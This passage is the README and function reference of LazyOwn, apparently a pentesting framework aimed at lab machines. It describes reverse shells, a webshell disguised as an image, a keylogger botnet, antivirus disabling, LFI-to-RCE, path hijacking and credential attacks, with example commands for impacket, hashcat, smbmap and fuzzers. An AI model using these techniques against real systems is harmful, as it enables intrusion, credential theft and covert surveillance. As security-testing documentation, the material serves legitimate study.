Ejecuta en la máquina víctima.
Ofrece opciones como iniciar un servidor HTTP, configurar netcat para escuchar conexiones, enviar archivos mediante netcat, configurar una shell reversa, entre otros.
Modo Cliente:

Ejecuta en la máquina atacante.
Ofrece opciones como descargar listas de SecLists, escanear puertos, enumerar servicios HTTP, verificar conectividad, monitorear procesos, ejecutar ataques LFI, entre otros.
Ejemplos de Uso
Uso Básico

```sh
./lazyatack.sh --modo servidor --ip 192.168.1.1 --atacante 192.168.1.100
```

```sh
./lazyatack.sh --modo cliente --url http://victima.com --ip 192.168.1.10
```

Esto ejecuta el script en modo cliente, configurando la URL de la víctima como <http://victima.com> y la IP de la víctima como 192.168.1.10.

## Funciones del Script

```
Funciones del Script
Descargar SecLists: Descarga y extrae las listas de SecLists para su uso.
Escanear Puertos: Ejecuta un escaneo completo de puertos usando nmap.
Escanear Puertos Específicos: Escanea puertos específicos (22, 80, 443).
Enumerar Servicios HTTP: Enumera servicios HTTP en la URL víctima.
Iniciar Servidor HTTP: Inicia un servidor HTTP en el puerto 80.
Configurar Netcat: Configura netcat para escuchar en el puerto 443.
Enviar Archivo Mediante Netcat: Envía un archivo a una escucha netcat.
Verificar Conectividad: Verifica la conectividad mediante ping y tcpdump.
Verificar Conectividad con Curl: Verifica la conectividad usando curl.
Configurar Shell Reversa: Configura una shell reversa.
Escuchar Shell con Netcat: Escucha una shell con netcat.
Monitorear Procesos: Monitorea los procesos en ejecución.
Ejecutar Wfuzz: Ejecuta un ataque de enumeración de directorios web con wfuzz.
Comprobar Permisos Sudo: Comprueba los permisos de sudo.
Explotar LFI: Explota una vulnerabilidad de inclusión de archivos locales.
Configurar TTY: Configura TTY para una sesión shell más estable.
Eliminar Archivos de Forma Segura: Elimina archivos de forma segura.
Obtener Root Shell mediante Docker: Obtiene una root shell mediante Docker.
Enumerar Archivos con SUID: Enumera archivos con permisos SUID.
Listar Timers de Systemd: Lista timers de systemd.
Comprobar Rutas de Comandos: Comprueba rutas de comandos.
Abusar de Tar: Abusa de tar para ejecutar una shell.
Enumerar Puertos Abiertos: Enumera puertos abiertos.
Eliminar Contenedores Docker: Elimina todos los contenedores Docker.
Escanear Red: Escanea la red con secuencia y xargs.
```

## Experimental LazyOwnWebShell en python

Corre en <http://localhost:5000> experimental, ya que aun no funciona la salida de la webshell de cara al navegador. pero los comandos si son ejecutados correctamente. por eso está en modo experimental... por no decir que aun tiene bugs xD

![Captura de pantalla 2024-06-09 030335](https://github.com/grisuno/LazyOwn/assets/1097185/4bc6e25a-5c69-4dbc-a1b1-a3c455b38bfd)

```sh
python3 main.py 
```

## Experimental ofuscación mediante pyinstaller

esto está en modo experimental y no funciona del todo, ya que tiene un problema de rutas. pronto ya contará con ofuscación mediante pyinstaller

```sh
./py2el.sh
```

## Experimental exploit netbios

esto está en modo experimental ya que aun no funciona... (proximamente quizas una implementacion de eternalblue entre otras cositas...)

```sh
run lazynetbios
```

## Experimental LazyBotNet con keylogger para windows y Linux

esto está en modo experimental y no funciona la desencriptación del log del keylogger xD
acá vemos por primera vez en accion el comando payload el cual nos setea toda la config en nuestro payload.json así podemos precargar la config antes de arrancar con el framework

```sh
payload
run lazybotnet
```

## Menús Interactivos

El script presenta menús interactivos para seleccionar las acciones a realizar. En modo servidor, muestra opciones relevantes para la máquina víctima, y en modo cliente, muestra opciones relevantes para la máquina atacante.

Interrupción Limpia
El script maneja la señal SIGINT (usualmente generada por Control + C) para salir limpiamente.

## Licencia

Este proyecto está licenciado bajo la Licencia GPL v3. La información contenida en GTFOBins es propiedad de sus autores, a quienes se les agradece enormemente por la información proporcionada.

## Agradecimientos

Un agradecimiento especial a  [GTFOBins](https://gtfobins.github.io/) por la valiosa información que proporcionan y a ti por utilizar este proyecto. Tambien ¡Gracias por tu apoyo Tito S4vitar! quien hace una tarea extraordinarìa de divulgaciòn. por supuesto que utilizo la funcion extractPorts en mi .zshrc :D

### Agradecimientos a pwntomate 🍅

una excelente herramienta que adapte un poco para que funcione con el proyecto todos los creditos son de su autor honze-net Andreas Hontzia visiten y denle amor al proyecto <https://github.com/honze-net/pwntomate>

## Abstract

LazyOwn es un marco de trabajo que agiliza el flujo del mismo y automatiza muchas tareas y pruebas mediante alias y distintas herramientas es como una navaja multiproposito con navajas multipropisitos para el hacking xD

# Documentation by readmeneitor.py

Documentación creada automaticamente por el script readmeneitor.py creado para este proyecto, quizas algún día tenga su propio repo por ahora no lo veo necesario.

# Documentation by readmeneitor.py

## print_error
Prints an error message to the console.

This function takes an error message as input and prints it to the console
with a specific format to indicate that it is an error.

:param error: The error message to be printed.
:type error: str
:return: None

## print_msg
Prints a message to the console.

This function takes a message as input and prints it to the console
with a specific format to indicate that it is an informational message.

:param msg: The message to be printed.
:type msg: str
:return: None

## print_warn
Prints a warning message to the console.

This function takes a warning message as input and prints it to the console
with a specific format to indicate that it is a warning.

:param warn: The warning message to be printed.
:type warn: str
:return: None

## signal_handler
Handles signals such as Control + C and shows a message on how to exit.

This function is used to handle signals like Control + C (SIGINT) and prints
a warning message instructing the user on how to exit the program using the
commands 'exit', 'q', or 'qa'.

:param sig: The signal number.
:type sig: int
:param frame: The current stack frame.
:type frame: frame
:return: None

## check_rhost
Checks if the remote host (rhost) is defined and shows an error message if it is not.

This function verifies if the `rhost` parameter is set. If it is not defined,
an error message is printed, providing an example and directing the user to
additional help.

:param rhost: The remote host to be checked.
:type rhost: str
:return: True if rhost is defined, False otherwise.
:rtype: bool

## check_lhost
Checks if the local host (lhost) is defined and shows an error message if it is not.

This function verifies if the `lhost` parameter is set. If it is not defined,
an error message is printed, providing an example and directing the user to
additional help.

:param lhost: The local host to be checked.
:type lhost: str
:return: True if lhost is defined, False otherwise.
:rtype: bool

## check_lport
Checks if the local port (lport) is defined and shows an error message if it is not.

This function verifies if the `lport` parameter is set. If it is not defined,
an error message is printed, providing an example and directing the user to
additional help.

:param lport: The local port to be checked.
:type lport: int or str
:return: True if lport is defined, False otherwise.
:rtype: bool

## is_binary_present
Internal function to verify if a binary is present on the operating system.

This function checks if a specified binary is available in the system's PATH
by using the `which` command. It returns True if the binary is found and False
otherwise.

:param binary_name: The name of the binary to be checked.
:type binary_name: str
:return: True if the binary is present, False otherwise.
:rtype: bool

## handle_multiple_rhosts
Internal function to handle multiple remote hosts (rhost) for operations.

This function is a decorator that allows an operation to be performed across
multiple remote hosts specified in `self.params["rhost"]`. It converts a single
remote host into a list if necessary, and then iterates over each host,
performing the given function with each host. After the operation, it restores
the original remote host value.

:param func: The function to be decorated and executed for each remote host.
:type func: function
:return: The decorated function.
:rtype: function

## check_sudo
Checks if the script is running with superuser (sudo) privileges, and if not,
restarts the script with sudo privileges.

This function verifies if the script is being executed with root privileges
by checking the effective user ID. If the script is not running as root,
it prints a warning message and restarts the script using sudo.

:return: None

## activate_virtualenv
Activates a virtual environment and starts an interactive shell.

This function activates a virtual environment located at `venv_path` and then
launches an interactive bash shell with the virtual environment activated.

:param venv_path: The path to the virtual environment directory.
:type venv_path: str
:return: None

## parse_proc_net_file
Internal function to parse a /proc/net file and extract network ports.

This function reads a file specified by `file_path`, processes each line to
extract local addresses and ports, and converts them from hexadecimal to decimal.
The IP addresses are converted from hexadecimal format to standard dot-decimal
notation. The function returns a list of tuples, each containing an IP address
and a port number.

:param file_path: The path to the /proc/net file to be parsed.
:type file_path: str
:return: A list of tuples, each containing an IP address and a port number.
:rtype: list of tuple

## get_open_ports
Internal function to get open TCP and UDP ports on the operating system.

This function uses the `parse_proc_net_file` function to extract open TCP and UDP
ports from the corresponding /proc/net files. It returns two lists: one for TCP
ports and one for UDP ports.

:return: A tuple containing two lists: the first list with open TCP ports and
        the second list with open UDP ports.
:rtype: tuple of (list of tuple, list of tuple)

## find_credentials
Searches for potential credentials in files within the specified directory.

This function uses a regular expression to find possible credentials such as
passwords, secrets, API keys, and tokens in files within the given directory.
It iterates through all files in the directory and prints any matches found.

:param directory: The directory to search for files containing credentials.
:type directory: str
:return: None

## rotate_char
Internal function to rotate characters for ROT cipher.

This function takes a character and a shift value, and rotates the character
by the specified shift amount. It only affects alphabetical characters, leaving
non-alphabetical characters unchanged.

:param c: The character to be rotated.
:type c: str
:param shift: The number of positions to shift the character.
:type shift: int
:return: The rotated character.
:rtype: str

## get_network_info
No description available.

## getprompt
Generate a command prompt string with network information and user status.

:param: None

:returns: A string representing the command prompt with network information and user status.

Manual execution:
To manually get a prompt string with network information and user status, ensure you have `get_network_info()` implemented to return a dictionary of network interfaces and their IPs. Then use the function to create a prompt string based on the current user and network info.

Example:
If the function `get_network_info()` returns:
    {
        'tun0': '10.0.0.1',
        'eth0': '192.168.1.2'
    }

And the user is root, the prompt string generated might be:
    [LazyOwn👽10.0.0.1]# 
If the user is not root, it would be:
    [LazyOwn👽10.0.0.1]$ 

If no 'tun' interface is found, the function will use the first available IP or fallback to '127.0.0.1'.

## wrapper
internal wrapper of internal function to implement multiples rhost to operate. 

# Documentation by readmeneitor.py

## xor_encrypt_decrypt
XOR Encrypt or Decrypt data with a given key

## __init__
Initializer for the LazyOwnShell class.

This method sets up the initial parameters and scripts for an instance of
the LazyOwnShell class. It initializes a dictionary of parameters with default
values and a list of script names that are part of the LazyOwnShell toolkit.

Attributes:
    params (dict): A dictionary of parameters with their default values.
    scripts (list): A list of script names included in the toolkit.
    output (str): An empty string to store output or results.

## default
Handles undefined commands, including aliases.

This method checks if a given command (or its alias) exists within the class
by attempting to find a corresponding method. If the command or alias is not
found, it prints an error message.

:param line: The command or alias to be handled.
:type line: str
:return: None

## one_cmd
Internal function to execute commands.

This method attempts to execute a given command using `onecmd` and captures
the output. It sets the `output` attribute based on whether the command was
executed successfully or an exception occurred.

:param command: The command to be executed.
:type command: str
:return: A message indicating the result of the command execution.
:rtype: str

## set
Set a parameter value.

This function takes a line of input, splits it into a parameter and a value, 
and sets the specified parameter to the given value if the parameter exists.

:param line: A string containing the parameter and value to be set. 
            Expected format: '<parameter> <value>'.
:type line: str
:return: None
:raises: ValueError if the input line does not contain exactly two elements.

## show
Show the current parameter values.

This function iterates through the current parameters and their values,
printing each parameter and its associated value.

:param line: This parameter is not used in the function.
:type line: str
:return: None

## list
Lists all available scripts in the modules directory.

This method prints a list of available scripts in a formatted manner, arranging
them into columns. It shows each script with sufficient spacing for readability.

:param line: This parameter is not used in the method.
:type line: str
:return: None

## run
Runs a specific LazyOwn script.

This method executes a script from the LazyOwn toolkit based on the provided
script name. If the script is not recognized, it prints an error message.
To see available scripts, use the `list` or `help list` commands.

:param line: The command line input containing the script name.
:type line: str
:return: None

## lazysearch
Runs the internal module `modules/lazysearch.py`.

This method executes the `lazysearch` script from the specified path, using
the `binary_name` parameter from the `self.params` dictionary. If `binary_name`
is not set, it prints an error message.

:return: None

## lazysearch_gui
Run internal module modules/LazyOwnExplorer.py

## lazyown
Run internal module modules/lazyown.py

## update_db
Run internal module modules/update_db.sh to update the db of binary exploitables from gtofbins

## lazynmap
Runs the internal module `modules/lazynmap.sh` for multiple Nmap scans.

This method executes the `lazynmap` script, using the current working directory
and the `rhost` parameter from the `self.params` dictionary as the target IP.
If `rhost` is not set, it prints an error message.

:return: None

## lazywerkzeugdebug
test werkzeug in debugmode Run internal module modules/lazywerkzeug.py

## lazygath
Run internal module modules/lazygat.sh

## lazynmapdiscovery
Runs the internal module `modules/lazynmap.sh` with discovery mode.

This method executes the `lazynmap` script in discovery mode. It uses the current
working directory for locating the script.

:return: None

## lazysniff
Runs the internal module `modules/lazysniff.py`.

This method executes the `lazysniff` script with the specified network device
from the `device` parameter in `self.params`. It sets environment variables for
language and terminal type and uses `subprocess.run` to handle the execution.

:return: None

## lazyftpsniff
Run internal module modules/lazyftpsniff.py

## lazynetbios
Run internal module modules/lazynetbios.py

## lazyhoneypot
Run internal module modules/lazyhoneypot.py

## lazygptcli
Run internal module modules/lazygptcli.py

## lazysearch_bot
Run internal module modules/lazysearch_bot.py

## lazymetaextract0r
Run internal module modules/lazyown_metaextract0r.py

## lazyownratcli
Run internal module modules/lazyownclient.py

## lazyownrat
Run internal module modules/lazyownserver.py

## lazybotnet
Run internal module modules/lazybotnet.py

## lazylfi2rce
Run internal module modules/lazylfi2rce.py

## lazylogpoisoning
Run internal module modules/lazylogpoisoning.py

## lazybotcli
Run internal module modules/lazybotcli.py

## lazyssh77enum
Run internal module modules/lazybrutesshuserenum.py

## lazyburpfuzzer
Run internal module modules/lazyown_burpfuzzer.py

## lazyreverse_shell
Run internal module modules/lazyreverse_shell.sh

## lazyarpspoofing
Run internal module modules/lazyarpspoofing.py

## lazyattack
Run internal module modules/lazyatack.sh

## lazymsfvenom
Runs the `msfvenom` tool to generate payloads based on user input.

Prompts the user to select a payload type from a list and executes the corresponding
`msfvenom` command to generate a payload. Moves the generated payloads to a `sessions`
directory and sets appropriate permissions. Optionally compresses the payloads using UPX
and handles a C payload with shikata_ga_nai.

:param line: Command line arguments for the script.
:return: None

## lazyaslrcheck
Checks the status of Address Space Layout Randomization (ASLR) on the system by reading
the value from /proc/sys/kernel/randomize_va_space.

The function executes the `cat` command to retrieve the ASLR status and prints the result.
Based on the retrieved value, it indicates whether ASLR is fully activated, partially activated,
or deactivated.

:returns: None

## lazypathhijacking
Creates a path hijacking attack by performing the following steps:

1. Appends the value of `binary_name` to a temporary script located at `modules/tmp.sh`.
2. Copies this temporary script to `/tmp` with the name specified by `binary_name`.
3. Sets executable permissions on the copied script.
4. Prepends `/tmp` to the system's PATH environment variable to ensure the script is executed in preference to other binaries.

The function then prints out each command being executed and a message indicating the binary name used for the path hijacking.

:param binary_name: The name of the binary to be used in the path hijacking attack.
:returns: None

## script
Run a script with the given arguments

## command
Run a command and print output in real-time

## payload
Load parameters from payload.json

## exit
Exit the command line interface.

## fixperm
Fix Perm LazyOwn shell

## lazywebshell
LazyOwn shell

## getcap
try get capabilities :)

## getseclist
get seclist :D

## smbclient
Interacts with SMB shares using the `smbclient` command to perform the following operations:

1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
2. If `line` (share name) is provided:
- Attempts to access the specified SMB share on the remote host using the command: `smbclient -N \\{rhost}\{line}`
3. If `line` is not provided:
- Lists available SMB shares on the remote host with the command: `smbclient -N -L \\{rhost}`
4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/share" /mnt/smb`

:param line: The name of the SMB share to access on the remote host. If not provided, the function will list all available shares.
:returns: None

## smbmap
smbmap -H 10.10.10.3 [OPTIONS] 
Uses the `smbmap` tool to interact with SMB shares on a remote host:

1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
2. If no `line` (share name or options) is provided:
- Attempts to access SMB shares on the remote host with a default user `deefbeef` using the command: `smbmap -H {rhost} -u 'deefbeef'`
3. If `line` is provided:
- Executes `smbmap` with the specified options or share name using the command: `smbmap -H {rhost} -R {line}`
4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/documents" /mnt/smb`

:param line: Options or share name to use with `smbmap`. If not provided, uses a default user to list shares.
:returns: None

## getnpusers
sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile sessions/users.txt
Executes the `impacket-GetNPUsers` command to enumerate users with Kerberos pre-authentication disabled.

1. Checks if the `line` (domain) argument is provided; if not, an error message is displayed, instructing the user to provide a domain.
2. Executes `impacket-GetNPUsers` with the following options:
- `-no-pass`: Skips password prompt.
- `-usersfile sessions/users.txt`: Specifies the file containing the list of users to check.

:param line: The domain to query. Must be provided in the format `domain.com`. Example usage: `getnpusers domain.com`
:returns: None

Manual execution:
To manually run this command, use the following syntax:
    sudo impacket-GetNPUsers <domain> -no-pass -usersfile sessions/users.txt
Replace `<domain>` with the actual domain name you want to query.

## psexec
Executes the `impacket-psexec` command to run a remote command on a target machine using the `administrator` account.

1. Retrieves the target host IP from the `rhost` parameter.
2. Checks if the `rhost` parameter is valid using `check_rhost()`. If invalid, the function returns early.
3. Executes the `impacket-psexec` command with the `administrator` account on the target host.

:param line: This parameter is not used in this command but is included for consistency with other methods.
:returns: None

Manual execution:
To manually run this command, use the following syntax:
    impacket-psexec administrator@<target_host>
Replace `<target_host>` with the IP address or hostname of the target machine.

## rpcdump
Executes the `rpcdump.py` script to dump RPC services from a target host.

1. Retrieves the target host IP from the `rhost` parameter.
2. Checks if the `rhost` parameter is valid using `check_rhost()`. If invalid, the function returns early.
3. Executes the `rpcdump.py` script on port 135 and 593 to gather RPC service information from the target host.

:param line: This parameter is not used in this command but is included for consistency with other methods.
:returns: None

Manual execution:
To manually run this command, use the following syntax:
    rpcdump.py -p 135 <target_host>
    rpcdump.py -p 593 <target_host>
Replace `<target_host>` with the IP address or hostname of the target machine.

## dig
Executes the `dig` command to query DNS information.

1. Retrieves the DNS server IP from the `line` parameter and the target host from the `rhost` parameter.
2. If either the DNS server or `rhost` is not provided, an error message is printed.
3. Executes the `dig` command to query the version of the DNS server and additional records.

:param line: DNS server IP or hostname. Must be provided for the `dig` command.
:param rhost: Target host for additional `dig` queries.

:returns: None

Manual execution:
To manually run these commands, use the following syntax:
    dig version.bind CHAOS TXT @<dns_server>
    dig any <domain> @<rhost>

Replace `<dns_server>` with the IP address or hostname of the DNS server, `<domain>` with the target domain, and `<rhost>` with the IP address or hostname of the target machine.

## cp
Copies a file from the ExploitDB directory to the sessions directory.

1. Retrieves the path to the ExploitDB directory and the target file from the `line` parameter.
2. Copies the specified file from the ExploitDB directory to the `sessions` directory in the current working directory.

:param line: The relative path to the file within the ExploitDB directory. For example, `java/remote/51884.py`.
:param exploitdb: The path to the ExploitDB directory. This must be set in advance or provided directly.

:returns: None

Manual execution:
To manually copy files, use the following syntax:
    cp <exploitdb_path><file_path> <destination_path>

Replace `<exploitdb_path>` with the path to your ExploitDB directory, `<file_path>` with the relative path to the file, and `<destination_path>` with the path where you want to copy the file.

For example:
    cp /usr/share/exploitdb/exploits/java/remote/51884.py /path/to/sessions/

## dnsenum
Performs DNS enumeration using `dnsenum` to identify subdomains for a given domain.

1. Executes the `dnsenum` command with parameters to specify the DNS server, output file, and wordlist for enumeration.

:param line: The target domain to perform DNS enumeration on, e.g., `ghost.htb`.
:param rhost: The DNS server to use for enumeration, e.g., `10.10.11.24`.
:param dnswordlist: The path to the DNS wordlist file used for subdomain discovery.

:returns: None

Manual execution:
To manually perform DNS enumeration, use the following command:
    dnsenum --dnsserver <dns_server> --enum -p 0 -s 0 -o <output_file> -f <dns_wordlist> <target_domain>

Replace `<dns_server>` with the DNS server IP, `<output_file>` with the file path to save the results, `<dns_wordlist>` with the path to your DNS wordlist file, and `<target_domain>` with the domain to be enumerated.

For example:
    dnsenum --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f /path/to/dnswordlist.txt ghost.htb

## dnsmap
Performs DNS enumeration using `dnsmap` to discover subdomains for a specified domain.

1. Executes the `dnsmap` command to scan the given domain with a specified wordlist.

:param line: The target domain to perform DNS enumeration on, e.g., `ghost.htb`.
:param dnswordlist: The path to the wordlist file used for DNS enumeration.

:returns: None

Manual execution:
To manually perform DNS enumeration, use the following command:
    dnsmap <target_domain> -w <dns_wordlist>

Replace `<target_domain>` with the domain you want to scan and `<dns_wordlist>` with the path to your DNS wordlist file.

For example:
    dnsmap ghost.htb -w /path/to/dnswordlist.txt

## whatweb
Performs a web technology fingerprinting scan using `whatweb`.

1. Executes the `whatweb` command to identify technologies used by the target web application.

:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
:param rhost: The target web host to be scanned, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually perform web technology fingerprinting, use the following command:
    whatweb <target_host>

Replace `<target_host>` with the URL or IP address of the web application you want to scan.

For example:
    whatweb example.com

## enum4linux
Performs enumeration of information from a target Linux/Unix system using `enum4linux`.

1. Executes the `enum4linux` command with the `-a` option to gather extensive information from the specified target.

:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
:param rhost: The target host for enumeration, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually enumerate information from a Linux/Unix system, use the following command:
    enum4linux -a <target_host>

Replace `<target_host>` with the IP address or hostname of the target system.

For example:
    enum4linux -a 192.168.1.10

## nbtscan
Performs network scanning using `nbtscan` to discover NetBIOS names and addresses in a specified range.

1. Executes the `nbtscan` command with the `-r` option to scan the specified range of IP addresses for NetBIOS information.

:param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
:param rhost: The target network range for scanning, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually perform a NetBIOS scan across a network range, use the following command:
    sudo nbtscan -r <network_range>

Replace `<network_range>` with the IP address range you want to scan. For example:
    sudo nbtscan -r 192.168.1.0/24

## rpcclient
Executes the `rpcclient` command to interact with a remote Windows system over RPC (Remote Procedure Call) using anonymous credentials.

1. Runs `rpcclient` with the `-U ''` (empty username) and `-N` (no password) options to connect to the target host specified by `rhost`.

:param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
:param rhost: The IP address of the remote host to connect to, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually interact with a remote Windows system using RPC, use the following command:
    rpcclient -U '' -N <target_ip>

Replace `<target_ip>` with the IP address of the target system. For example:
    rpcclient -U '' -N 10.10.10.10

## nikto
Runs the `nikto` tool to perform a web server vulnerability scan against the specified target host.

1. Executes `nikto` with the `-h` option to specify the target host IP address.

:param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
:param rhost: The IP address of the target web server, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually perform a web server vulnerability scan using `nikto`, use the following command:
    nikto -h <target_ip>

Replace `<target_ip>` with the IP address of the target web server. For example:
    nikto -h 10.10.10.10

## openssl_sclient
Uses `openssl s_client` to connect to a specified host and port, allowing for testing and debugging of SSL/TLS connections.

:param line: The port number to connect to on the target host. This must be provided as an argument.
:param rhost: The IP address or hostname of the target server, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually connect to a server using `openssl s_client` and test SSL/TLS, use the following command:
    openssl s_client -connect <target_ip>:<port>

Replace `<target_ip>` with the IP address or hostname of the target server and `<port>` with the port number. For example:
    openssl s_client -connect 10.10.10.10:443

## ss
Uses `searchsploit` to search for exploits in the Exploit Database based on the provided search term.

:param line: The search term or query to find relevant exploits. This must be provided as an argument.

:returns: None

Manual execution:
To manually search for exploits using `searchsploit`, use the following command:
    searchsploit <search_term>

Replace `<search_term>` with the term or keyword you want to search for. For example:
    searchsploit kernel

## wfuzz
Uses `wfuzz` to perform fuzzing based on provided parameters. This function supports various options for directory and file fuzzing.

:param line: The options and arguments for `wfuzz`. The `line` parameter can include the following:
    - `sub <domain>`: Fuzz DNS subdomains. Requires `dnswordlist` to be set.
    - `iis`: Fuzz IIS directories. Uses a default wordlist if `iiswordlist` is not set.
    - Any other argument: General directory and file fuzzing.

:returns: None

Manual execution:
To manually use `wfuzz` for directory and file fuzzing, use the following commands:

1. For fuzzing DNS subdomains:
    wfuzz -c <extra_options> -t <threads> -w <wordlist> -H 'Host: FUZZ.<domain>' <domain>

Example:
    wfuzz -c --hl=7 -t 200 -w /path/to/dnswordlist -H 'Host: FUZZ.example.com' example.com

2. For fuzzing IIS directories:
    wfuzz -c <extra_options> -t <threads> -w /path/to/iiswordlist http://<rhost>/FUZZ

Example:
    wfuzz -c --hl=7 -t 200 -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt http://10.10.10.10/FUZZ

3. For general directory and file fuzzing:
    wfuzz -c <extra_options> -t <threads> -w <wordlist> http://<rhost>/FUZZ

Example:
    wfuzz -c --hl=7 -t 200 -w /path/to/dirwordlist http://10.10.10.10/FUZZ

## gobuster
Uses `gobuster` for directory and virtual host fuzzing based on provided parameters. Supports directory enumeration and virtual host discovery.

:param line: The options and arguments for `gobuster`. The `line` parameter can include the following:
    - `url`: Perform directory fuzzing on a specified URL. Requires `url` and `dirwordlist` to be set.
    - `vhost`: Perform virtual host discovery on a specified URL. Requires `url` and `dirwordlist` to be set.
    - Any other argument: General directory fuzzing with additional parameters.

:returns: None

Manual execution:
To manually use `gobuster`, use the following commands:

1. For directory fuzzing:
    gobuster dir --url <url>/ --wordlist <wordlist>

Example:
    gobuster dir --url http://example.com/ --wordlist /path/to/dirwordlist

2. For virtual host discovery:
    gobuster vhost --append-domain -u <url> -w <wordlist> --random-agent -t 600

Example:
    gobuster vhost --append-domain -u http://example.com -w /path/to/dirwordlist --random-agent -t 600

3. For general directory fuzzing with additional parameters:
    gobuster dir --url http://<rhost>/ --wordlist <wordlist> <additional_parameters>

Example:
    gobuster dir --url http://10.10.10.10/ --wordlist /path/to/dirwordlist -x .php,.html

## addhosts
Adds an entry to the `/etc/hosts` file, mapping an IP address to a domain name.

:param line: The domain name to be added to the `/etc/hosts` file.
    - Example: `permx.htb`

:returns: None

Manual execution:
To manually add a domain to the `/etc/hosts` file, use the following command:

    sudo sh -c -e "echo '<rhost> <domain>' >> /etc/hosts"

Example:
    sudo sh -c -e "echo '10.10.11.23 permx.htb' >> /etc/hosts"

This command appends the IP address and domain name to the `/etc/hosts` file, enabling local resolution of the domain.

## cme
Performs an SMB enumeration using `crackmapexec`.

:param line: Not used in this function.

:returns: None

Manual execution:
To manually run `crackmapexec` for SMB enumeration, use the following command:

    crackmapexec smb <target>

Example:
    crackmapexec smb 10.10.11.24

This command will enumerate SMB shares and perform basic SMB checks against the specified target IP address.

## ldapdomaindump
Dumps LDAP information using `ldapdomaindump` with credentials from a file.

:param line: The domain to use for authentication (e.g., 'domain.local').

:returns: None

Manual execution:
To manually run `ldapdomaindump` for LDAP enumeration, use the following command:

    ldapdomaindump -u '<domain>\<username>' -p '<password>' <target>

Example:
    ldapdomaindump -u 'domain.local\Administrator' -p 'passadmin123' 10.10.11.23

Ensure you have a file `sessions/credentials.txt` in the format `user:password`, where each line contains credentials for the LDAP enumeration.

## bloodhound
Perform LDAP enumeration using bloodhound-python with credentials from a file.

:param line: This parameter is not used in the function but could be used for additional options or domain information.

:returns: None

Manual execution:
To manually run `bloodhound-python` for LDAP enumeration, use the following command:

    bloodhound-python -c All -u '<username>' -p '<password>' -ns <target>

Example:
    bloodhound-python -c All -u 'usuario' -p 'password' -ns 10.10.10.10

Ensure you have a file `sessions/credentials.txt` with the format `user:password`, where each line contains credentials for enumeration.

## ping
Perform a ping to check host availability and infer the operating system based on TTL values.

:param line: This parameter is not used in the function but could be used for additional options or settings.

:returns: None

Manual execution:
To manually ping a host and determine its operating system, use the following command:

    ping -c 1 <target>

Example:
    ping -c 1 10.10.10.10

The TTL (Time To Live) value is used to infer the operating system:
- TTL values around 64 typically indicate a Linux system.
- TTL values around 128 typically indicate a Windows system.

Ensure you have set `rhost` to the target host for the command to work.

## gospider
try gospider

## arpscan
try arp-scan

## lazypwn
LazyPwn

## fixel
to fix perms

## smbserver
Lazy imacket smbserver

## sqlmap
Lazy sqlmap try sqlmap -wizard if don't know how to use requests.txt file always start with req and first parameter

## proxy
Small proxy to modify the request on the fly...

## createwebshell
Crea una webshell disfrazada de jpg en el directorio sessions/

## createrevshell
Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport

## createwinrevshell
Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport

## createhash
Crea un archivo hash.txt en el directorio sessions

## createcredentials
Crea un archivo credentials.txt en el directorio sessions el forato debe ser: user:password

## createcookie
Crea un archivo cookie.txt en el directorio sessions con el formato de una cookie válida.

## download_resources
download resources in sessions

## download_exploit
download exploits in external/.exploits/

## dirsearch
dirsearch -u http://url.ext/ -x 403,404,400

## john2hash
example: sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -format=Raw-SHA512

## hashcat
hashcat -a 0 -m mode hash /usr/share/wordlists/rockyou.txt

## complete_hashcat
Complete mode options and file paths for the sessions/hash.txt

## responder
sudo responder -I tun0

## ip
ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [[96m" iface"[0m] "a[1] }' and copy de ip to clipboard :)

## rhost
Copy rhost to clipboard

## banner
Show the banner

## py3ttyup
copy to clipboard tipical python3 -c 'import pty; pty.spawn ... bla bla blah...

## rev
Copy a revshell to clipboard

## img2cookie
Copy a malicious img tag to clipboard

## disableav
visual basic script to try to disable antivirus

## conptyshell
Download ConPtyShell in sessions directory and copy to clipboard the command :D

## pwncatcs
run pwncat-cs -lp <PORT> :)

## find
copy to clipboard this command always forgot :) find / -type f -perm -4000 2>/dev/null

## sh
execute some command direct in shell to avoid exit LazyOwn ;)

## pwd
'echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"'

## qa
Exit fast without confirmation

## ignorearp
echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore

## ignoreicmp
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

## acknowledgearp
echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore

## acknowledgeicmp
echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all

## clock
Show the time to go sleep xD

## ports
Get all ports local

## ssh
Conecta a un host SSH usando credenciales desde un archivo y el puerto especificado.

## cports
Genera un comando para mostrar puertos TCP y UDP, y lo copia al portapapeles.

## vpn
Open VPN like HTB VPN command vpn now handle multiple ovpn files

## id_rsa
create id_rsa file, open nano sessions/id_rsa, usage like this: id_rsa username, open nano and you paste the private key, and run ssh command

## www
Start a web server with python3

## wrapper
copy to clipboard some wrapper to lfi

## samrdump
impacket-samrdump -port 445 10.10.10.10

## urlencode
Encode a string for URL.

## urldecode
Decode a URL-encoded string.

## lynis
sudo lynis audit system remote 10.10.10.10 more info check modules/lazylynis.sh

## snmpcheck
snmp-check 10.10.10.10

## encode
